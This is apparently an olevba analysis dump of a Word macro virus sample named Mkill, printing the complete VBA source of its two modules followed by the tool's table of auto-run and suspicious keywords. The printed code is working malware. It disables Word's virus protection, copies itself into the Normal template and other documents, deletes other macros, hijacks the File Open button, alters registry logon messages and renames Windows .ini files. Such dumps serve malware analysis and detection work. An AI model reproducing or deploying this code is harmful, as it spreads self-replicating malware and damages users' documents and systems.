olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Mkill-ccda5d83f73cf76c0e99111a32f96ccd7196594d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Mkill-ccda5d83f73cf76c0e99111a32f96ccd7196594d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Dim A1, A2, A3, A4 As Boolean
Dim A5, A6 As Object
Dim A7, A8, A16 As Integer
Dim A10, A11, A12, A13, A14 As String
Rem :-D you are marked!.it's just shit
Const A15 = "I Love Amon"
Private Sub Document_Open()
On Error Resume Next
jest
Set A5 = ActiveDocument.VBProject.VBComponents.Item(1)
Set A6 = NormalTemplate.VBProject.VBComponents.Item(1)
A3 = A5.CodeModule.Find(A15, 1, 1, 100, 100)
A4 = A6.CodeModule.Find(A15, 1, 1, 100, 100)
With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
If A4 = False Then
    A6.CodeModule.DeleteLines 1, A6.CodeModule.CountOfLines
End If
If A3 = False Then
        A5.CodeModule.DeleteLines 1, A5.CodeModule.CountOfLines
End If
End Sub
Private Sub Document_Close()
On Error Resume Next
jest
Set A5 = ActiveDocument.VBProject.VBComponents.Item(1)
Set A6 = NormalTemplate.VBProject.VBComponents.Item(1)
A3 = A5.CodeModule.Find(A15, 1, 1, 100, 100)
A4 = A6.CodeModule.Find(A15, 1, 1, 100, 100)
With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
If (A3 = True Xor A4 = True) And _
   (ActiveDocument.SaveFormat = wdFormatDocument Or _
   ActiveDocument.SaveFormat = wdFormatTemplate) Then
      If A3 = True Then
        A2 = NormalTemplate.Saved
        A11 = A5.CodeModule.Lines(1, A5.CodeModule.CountOfLines)
        A6.CodeModule.DeleteLines 1, A6.CodeModule.CountOfLines
        A6.CodeModule.AddFromString A11
        With Dialogs(wdDialogFileSummaryInfo): .Title = "": .Subject = "": .Author = "": .Category = "": .Keywords = "": .Comments = "": .Execute: End With
        If A2 = True Then NormalTemplate.Save
      End If
    If A4 = True Or ActiveDocument.Saved = False Then
     A1 = ActiveDocument.Saved
     A11 = A6.CodeModule.Lines(1, A6.CodeModule.CountOfLines)
     A5.CodeModule.DeleteLines 1, A5.CodeModule.CountOfLines
     A5.CodeModule.AddFromString A11
     With Dialogs(wdDialogFileSummaryInfo): .Title = "": .Subject = "": .Author = "": .Category = "": .Keywords = "": .Comments = "": .Execute: End With
     If A1 = True Then ActiveDocument.Save
   End If
End If
End Sub
Private Sub Document_new()
On Error Resume Next
jest
Set A5 = ActiveDocument.VBProject.VBComponents.Item(1)
Set A6 = NormalTemplate.VBProject.VBComponents.Item(1)
A3 = A5.CodeModule.Find(A15, 1, 1, 100, 100)
A4 = A6.CodeModule.Find(A15, 1, 1, 100, 100)
With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
If A4 = False Then
    A6.CodeModule.DeleteLines 1, A6.CodeModule.CountOfLines
End If
If A3 = False Then
        A5.CodeModule.DeleteLines 1, A5.CodeModule.CountOfLines
End If
End Sub
Private Function jest()
Dim DelFlag As Boolean
Dim DocAmon, TempAmon, DocAmonL, TempAmonL As Boolean
Dim i, x As Integer
Dim MacroNames As String
On Error GoTo Getout
Application.ScreenUpdating = False
Application.DisplayAlerts = wdAlertsNone
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
DocAmon = False
TempAmon = False
DocAmonL = False
TempAmonL = False
DelFlag = True
Do While (DelFlag)
For i = 1 To ActiveDocument.VBProject.VBComponents.Count
MacroNames = ActiveDocument.VBProject.VBComponents(i).Name
    If MacroNames <> "AmonClean" And MacroNames <> "ThisDocument" Then
     Application.OrganizerDelete Source:=ActiveDocument.FullName, _
     Name:=MacroNames, Object:=wdOrganizerObjectProjectItems
     DelFlag = True
     MsgBox "Find Micro [" & MacroNames & "] ,I shall kill it!" _
    , vbCritical, "Micro Virus Killer Ver. 1.2"
     Exit For
     Else
     DelFlag = False
    End If
Next
Loop
DelFlag = True
Do While (DelFlag)
For i = 1 To NormalTemplate.VBProject.VBComponents.Count
MacroNames = NormalTemplate.VBProject.VBComponents(i).Name
    If MacroNames <> "AmonClean" And MacroNames <> "ThisDocument" Then
     Application.OrganizerDelete Source:=NormalTemplate.FullName, _
     Name:=MacroNames, Object:=wdOrganizerObjectProjectItems
     DelFlag = True
     MsgBox "Find Micro [" & MacroNames & "] ,I shall kill it!" _
    , vbCritical, "Micro Virus Killer Ver. 1.2"
     Exit For
     Else
     DelFlag = False
    End If
Next
Loop
For x = 1 To NormalTemplate.VBProject.VBComponents.Count
    If NormalTemplate.VBProject.VBComponents(x).Name = "AmonClean" Then
       TempAmon = True
       If NormalTemplate.VBProject.VBComponents(x).CodeModule.CountOfLines < 50 Then
       TempAmonL = True
       End If
    End If
Next
For x = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents(x).Name = "AmonClean" Then
       DocAmon = True
        If ActiveDocument.VBProject.VBComponents(x).CodeModule.CountOfLines < 50 Then
        DocAmonL = True
        End If
    End If
Next
If DocAmonL = True Then
    DocAmon = False
     Application.OrganizerDelete Source:=ActiveDocument.FullName, _
     Name:="AmonClean", Object:=wdOrganizerObjectProjectItems
    End If
If TempAmonL = True Then
    TempAmon = False
     Application.OrganizerDelete Source:=NormalTemplate.FullName, _
     Name:="AmonClean", Object:=wdOrganizerObjectProjectItems
    End If
  If DocAmon = False And TempAmon = False Then
    Application.OrganizerCopy Source:=Options.DefaultFilePath(6) & "\MicroKiller.dot", _
    Destination:=NormalTemplate.FullName, Name:="AmonClean", _
    Object:=wdOrganizerObjectProjectItems
     Application.OrganizerCopy Source:=Options.DefaultFilePath(6) & "\MicroKiller.dot", _
    Destination:=ActiveDocument.FullName, Name:="AmonClean", _
    Object:=wdOrganizerObjectProjectItems
    DocAmon = True
    TempAmon = True
  End If
 If DocAmon = False Then
    Application.OrganizerCopy Source:=NormalTemplate.FullName, _
    Destination:=ActiveDocument.FullName, Name:="AmonClean", _
    Object:=wdOrganizerObjectProjectItems
    Temo
     End If
 If TempAmon = False Then
    Application.OrganizerCopy Source:=ActiveDocument.FullName, _
    Destination:=NormalTemplate.FullName, Name:="AmonClean", _
    Object:=wdOrganizerObjectProjectItems
   Temo
   End If
Getout:
 End Function
Private Function Temo()
Dim a, c As String
Dim b As Long
On Error GoTo Getout
c = Dir(Options.DefaultFilePath(6) & "\MicroKiller.dot")
If c = "" Then
a = ActiveDocument.FullName
b = ActiveDocument.SaveFormat
ActiveDocument.SaveAs FileName:=Options.DefaultFilePath(6) & "\MicroKiller.dot", FileFormat:=wdFormatDocument, AddToRecentFiles:=False
ActiveDocument.SaveAs FileName:=a, FileFormat:=b, AddToRecentFiles:=False
End If
Getout:
End Function
































-------------------------------------------------------------------------------
VBA MACRO AmonClean.bas 
in file: Virus.MSWord.Mkill-ccda5d83f73cf76c0e99111a32f96ccd7196594d - OLE stream: 'Macros/VBA/AmonClean'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Function just()
Dim DelFlag As Boolean
Dim DocAmon, TempAmon, DocAmonL, TempAmonL As Boolean
Dim i, x As Integer
Dim MacroNames As String
On Error GoTo Getout
Application.ScreenUpdating = False
Application.DisplayAlerts = wdAlertsNone
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
DocAmon = False
TempAmon = False
DocAmonL = False
TempAmonL = False
DelFlag = True
Do While (DelFlag)
For i = 1 To ActiveDocument.VBProject.VBComponents.Count
MacroNames = ActiveDocument.VBProject.VBComponents(i).Name
    If MacroNames <> "AmonClean" And MacroNames <> "ThisDocument" Then
     Application.OrganizerDelete Source:=ActiveDocument.FullName, _
     Name:=MacroNames, Object:=wdOrganizerObjectProjectItems
     DelFlag = True
     MsgBox "Find Micro [" & MacroNames & "] ,I shall kill it!" _
    , vbCritical, "Micro Virus Killer Ver. 1.2"
     Exit For
     Else
     DelFlag = False
    End If
Next
Loop
DelFlag = True
Do While (DelFlag)
For i = 1 To NormalTemplate.VBProject.VBComponents.Count
MacroNames = NormalTemplate.VBProject.VBComponents(i).Name
    If MacroNames <> "AmonClean" And MacroNames <> "ThisDocument" Then
     Application.OrganizerDelete Source:=NormalTemplate.FullName, _
     Name:=MacroNames, Object:=wdOrganizerObjectProjectItems
     DelFlag = True
     MsgBox "Find Micro [" & MacroNames & "] ,I shall kill it!" _
    , vbCritical, "Micro Virus Killer Ver. 1.2"
     Exit For
     Else
     DelFlag = False
    End If
Next
Loop
For x = 1 To NormalTemplate.VBProject.VBComponents.Count
    If NormalTemplate.VBProject.VBComponents(x).Name = "AmonClean" Then
       TempAmon = True
       If NormalTemplate.VBProject.VBComponents(x).CodeModule.CountOfLines < 50 Then
       TempAmonL = True
       End If
    End If
Next
For x = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents(x).Name = "AmonClean" Then
       DocAmon = True
        If ActiveDocument.VBProject.VBComponents(x).CodeModule.CountOfLines < 50 Then
        DocAmonL = True
        End If
    End If
Next
If DocAmonL = True Then
    DocAmon = False
     Application.OrganizerDelete Source:=ActiveDocument.FullName, _
     Name:="AmonClean", Object:=wdOrganizerObjectProjectItems
    End If
If TempAmonL = True Then
    TempAmon = False
     Application.OrganizerDelete Source:=NormalTemplate.FullName, _
     Name:="AmonClean", Object:=wdOrganizerObjectProjectItems
    End If
 If DocAmon = False Then
    Application.OrganizerCopy Source:=NormalTemplate.FullName, _
    Destination:=ActiveDocument.FullName, Name:="AmonClean", _
    Object:=wdOrganizerObjectProjectItems
   Temo
 End If
 If TempAmon = False Then
    Application.OrganizerCopy Source:=ActiveDocument.FullName, _
    Destination:=NormalTemplate.FullName, Name:="AmonClean", _
    Object:=wdOrganizerObjectProjectItems
Temo
 End If
Getout:
 End Function
Private Function Temo()
Dim a, c As String
Dim b As Long
On Error GoTo Getout
c = Dir(Options.DefaultFilePath(6) & "\MicroKiller.dot")
If c = "" Then
a = ActiveDocument.FullName
b = ActiveDocument.SaveFormat
ActiveDocument.SaveAs FileName:=Options.DefaultFilePath(6) & "\MicroKiller.dot", FileFormat:=wdFormatDocument, AddToRecentFiles:=False
ActiveDocument.SaveAs FileName:=a, FileFormat:=b, AddToRecentFiles:=False
End If
Getout:
End Function
 Function Acting()
 Dim ch, Aname, N, MyName As String
 On Error GoTo Getout
      ch = System.PrivateProfileString("", _
      "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "Amon")
ch = Val(ch) + 1
System.PrivateProfileString("", _
      "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "Amon") = ch
  If (Val(ch) > 1976 And System.Version = "4.10") Then
    System.PrivateProfileString("", _
      "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\winlogon", "legalNoticecaption") = "I Believe Enough To Say That..."
    System.PrivateProfileString("", _
      "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\winlogon", "legalNoticeText") = "I Love Amon"
  End If
  If Val(ch) > 2001 Or (Val(ch) > 1976 And System.Version <> "4.10") Then
      Aname = System.PrivateProfileString("", _
      "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "oldwindir")
      MyName = Dir(Aname + "\*.ini")
      Do While MyName <> ""
      N = Left(MyName, Len(MyName) - 3) + "lnl": Name Aname + "\" + MyName As Aname + "\" + N: MyName = Dir
      Loop
  End If
Getout:
End Function
Sub Doit()
On Error Resume Next
Dim x1, x2, x3, x4
Dim ctl
Dim zz As String
Dim z  As Integer
Set x1 = Application.CommandBars("Standard").Controls
  For z = 1 To x1.Count
    If x1.Item(z).ID = 23 Then
        x1.Item(z).Delete
        x1.Add Type:=msoControlButton, _
          ID:=1, Before:=2
        x1.Item(z).FaceId = 23
        x1.Item(z).OnAction = "NoNo"
    End If
  Next
Set x2 = CommandBars.ActiveMenuBar.Controls.Item(1)
Set x3 = x2.CommandBar.Controls
  For z = 1 To x3.Count
   If x3.Item(z).ID = 23 Then
    zz = x3.Item(z).Caption
    x3.Item(z).Delete
    x3.Add Type:=msoControlButton, _
          ID:=1, Before:=2
    x3.Item(z).FaceId = 23
    x3.Item(z).OnAction = "NoNo"
    x3.Item(z).Caption = zz
   End If
  Next
jojy:
End Sub
Sub NoNo()
Dim ach
ItOn
ach = Dialogs(wdDialogFileOpen).Show
If ach <> 0 Then
just
Acting
End If
ItOff
End Sub
Sub Fileopen()
NoNo
End Sub
Sub AutoOpen()
ItOn
Doit
just
Acting
ItOff
End Sub
Sub AutoClose()
ItOn
Doit
just
Acting
ItOff
End Sub
Sub AutoNew()
just
Doit
Acting
End Sub
Sub fileexit()
autoexit
End Sub
Sub autoexit()
Doit
ItOn
just
Acting
ItOff
End Sub
Sub autoexec()
Doit
just
Acting
ItOn
just
Acting
ItOff
End Sub
Function ItOn()
WordBasic.DisableAutoMacros True
End Function
Function ItOff()
WordBasic.DisableAutoMacros False
End Function
Sub ViewVBCode()
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |autoexit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|AutoExec  |Document_new        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|kill                |May delete a file                            |
|Suspicious|Doit                |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

